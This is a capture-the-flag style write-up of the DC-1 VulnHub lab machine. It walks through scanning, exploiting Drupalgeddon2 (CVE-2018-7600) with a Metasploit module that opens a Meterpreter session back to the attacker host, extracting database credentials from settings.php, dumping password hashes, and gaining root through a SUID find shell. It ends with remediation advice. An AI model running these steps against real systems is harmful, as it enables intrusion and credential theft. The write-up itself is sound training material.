# 🛡️ DC-1 VulnHub — Full Penetration Test Writeup

> **Difficulty:** Beginner | **OS:** Linux (Debian) | **CVE:** CVE-2018-7600 (Drupalgeddon2)

---

## Objective
Perform a complete penetration test and achieve root access on the DC-1 VulnHub machine.

---

## Attack Chain
```
Recon → Port Scan → Enumeration → Exploit (RCE) → Shell → Credentials → DB → PrivEsc → Root
```

---

## Walkthrough

### 1. Host Discovery
```bash
netdiscover -i eth1
```
**Result:** Target identified at `192.168.56.102`

---

### 2. Port Scanning
```bash
nmap -p- -O 192.168.56.102
```
**Open ports:** 22 (SSH), 80 (HTTP), 111 (RPC)  
**OS:** Linux — Debian

---

### 3. Service Enumeration
```bash
nmap -sV -p22,80,111 192.168.56.102
```
**Found:** Apache 2.2.22, PHP 5.4, Drupal CMS suspected

---

### 4. Web Enumeration & Vulnerability Scanning
```bash
# Browse to target
http://192.168.56.102

# Run Nikto
nikto -h http://192.168.56.102
```
**Found:** Drupal 7 login page confirmed. Nikto surfaced exposed paths and misconfigurations.  
**Vulnerability:** Drupalgeddon2 (CVE-2018-7600) — unauthenticated RCE.

---

### 5. Exploitation (Metasploit)
```bash
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
run
```
**Result:** Meterpreter session opened as `www-data`

Spawn a TTY shell:
```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 6. Flag 1 & Credential Extraction
```bash
cat flag1.txt           # Hint → check the config file
cat sites/default/settings.php
```
**Credentials found:**
```
dbuser : R0ck3t
```

---

### 7. Database Enumeration
```bash
mysql -u dbuser -p
use drupaldb;
select * from users;
```
**Extracted:** Password hashes for `admin` and `Fred`

---

### 8. Privilege Escalation — SUID `find`
```bash
find /dev -name null -exec /bin/sh \;
```
**Result:** `euid = 0` — root shell obtained.

> The `find` binary had the SUID bit set, allowing any user to spawn a shell with root privileges.

---

### 9. Final Flag
```bash
cd /root
cat thefinalflag.txt
```
**System fully compromised.**

---

## Key Vulnerabilities

| Severity | Vulnerability | Description |
|----------|--------------|-------------|
| Critical | Drupalgeddon2 RCE | CVE-2018-7600 — unauthenticated code execution on Drupal 7 |
| High | Exposed config file | `settings.php` leaked plaintext DB credentials |
| Medium | SUID misconfiguration | `find` binary with SUID bit enabled shell spawn as root |

---

## Recommendations

- **Patch Drupal** — Upgrade immediately. Drupal 7 is end-of-life.
- **Restrict `settings.php`** — Set file permissions to `440`. Never expose config files to the web process.
- **Audit SUID binaries** — Run `find / -perm -4000` regularly and remove SUID from non-essential binaries.
- **Least-privilege DB access** — The database user should have only the minimum required permissions.
- **Implement patch management** — Establish a process for tracking and applying CMS and OS updates.
